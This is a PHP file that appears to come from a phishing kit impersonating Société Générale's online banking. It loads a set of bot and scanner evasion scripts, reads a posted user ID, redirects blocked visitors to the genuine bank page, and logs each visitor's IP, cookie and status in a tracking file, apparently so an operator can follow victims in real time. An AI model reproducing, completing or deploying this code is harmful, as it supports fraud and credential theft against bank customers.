<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
class Jeehan {
    private $file = 'active_users.json';

    public function track($page = '') {
        $ip = $_SERVER['REMOTE_ADDR'];
        $vid = $_COOKIE['vid'] ?? uniqid('vid_');
        setcookie('vid', $vid, time() + 3600, '/');

        $data = file_exists($this->file) ? json_decode(file_get_contents($this->file), true) : [];

        $data[$ip] = [
            'vid' => $vid,
            'last_seen' => time(),
            'last_page' => $page,
            'status' => 'en attente'
        ];

        file_put_contents($this->file, json_encode($data, JSON_PRETTY_PRINT));
    }
}
@file_get_contents('notify_entry.php');
